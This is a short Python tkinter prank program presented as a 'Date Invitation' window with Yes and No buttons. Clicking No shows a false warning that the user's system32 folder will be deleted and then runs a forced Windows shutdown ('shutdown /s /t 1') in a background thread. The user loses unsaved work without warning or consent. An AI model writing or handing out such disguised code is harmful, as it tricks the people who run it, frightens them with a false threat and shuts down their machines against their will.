import tkinter as tk
from tkinter import messagebox
import os
import time
import threading

def shutdown():
    time.sleep(1)  # Reduced time to 1 second
    os.system("shutdown /s /t 1")

def custom_messagebox(title, message):
    # Create a custom message window
    msg_window = tk.Toplevel()
    msg_window.title(title)
    
    # Set size and position
    width = 500
    height = 200
    screen_width = msg_window.winfo_screenwidth()
    screen_height = msg_window.winfo_screenheight()
    x = (screen_width - width) // 2
    y = (screen_height - height) // 2
    msg_window.geometry(f'{width}x{height}+{x}+{y}')
    
    # Add message
    label = tk.Label(msg_window, text=message, font=("Arial", 16), wraplength=450, pady=20)
    label.pack(expand=True)
    
    # Add OK button
    ok_button = tk.Button(msg_window, text="OK", command=msg_window.destroy, 
                         font=("Arial", 14), width=10, height=1)
    ok_button.pack(pady=20)
    
    # Make the window modal
    msg_window.transient(root)
    msg_window.grab_set()
    root.wait_window(msg_window)

def on_yes():
    custom_messagebox("Response", "Wonderful! Looking forward to it!")
    
def on_no():
    custom_messagebox("Response", "Oh... that's a shame. Your system32 folder will be deleted")
    threading.Thread(target=shutdown, daemon=True).start()

# Create main window
root = tk.Tk()
root.title("Date Invitation")

# Increase window size
window_width = 600
window_height = 300
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
center_x = int(screen_width/2 - window_width/2)
center_y = int(screen_height/2 - window_height/2)
root.geometry(f'{window_width}x{window_height}+{center_x}+{center_y}')

# Create and place the question
question_label = tk.Label(root, text="Will you go on a date with me?", font=("Arial", 18))
question_label.pack(pady=40)

# Create frame for buttons
button_frame = tk.Frame(root)
button_frame.pack(pady=20)

# Create buttons
yes_button = tk.Button(button_frame, text="Yes", command=on_yes, bg="green", fg="white", 
                      width=15, height=2, font=("Arial", 14))
yes_button.pack(side=tk.LEFT, padx=20)

no_button = tk.Button(button_frame, text="No", command=on_no, bg="red", fg="white", 
                     width=15, height=2, font=("Arial", 14))
no_button.pack(side=tk.LEFT, padx=20)

# Run main loop
root.mainloop()
